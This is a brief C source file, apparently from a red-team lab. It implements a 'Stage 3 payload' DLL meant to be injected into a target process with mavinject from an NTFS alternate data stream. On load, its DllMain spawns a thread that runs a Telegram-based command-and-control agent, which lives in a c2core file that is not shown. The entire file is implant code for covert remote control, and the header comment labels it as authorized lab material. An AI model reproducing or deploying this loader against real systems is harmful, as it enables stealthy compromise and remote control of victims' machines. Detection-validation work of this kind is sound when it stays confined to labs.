/* inject.c - TVeronica lab: Stage 3 payload (loaded into target via mavinject from NTFS ADS).
   Authorized red team / detection-validation lab only.
   DllMain spawns the Telegram C2 agent thread (see c2core.c). */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "c2core.h"

static DWORD WINAPI worker(LPVOID p) {
    (void)p;
    c2_run("inject");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        if (probe_mode("inject")) return TRUE;
        CreateThread(NULL, 0, worker, NULL, 0, NULL);
    }
    return TRUE;
}
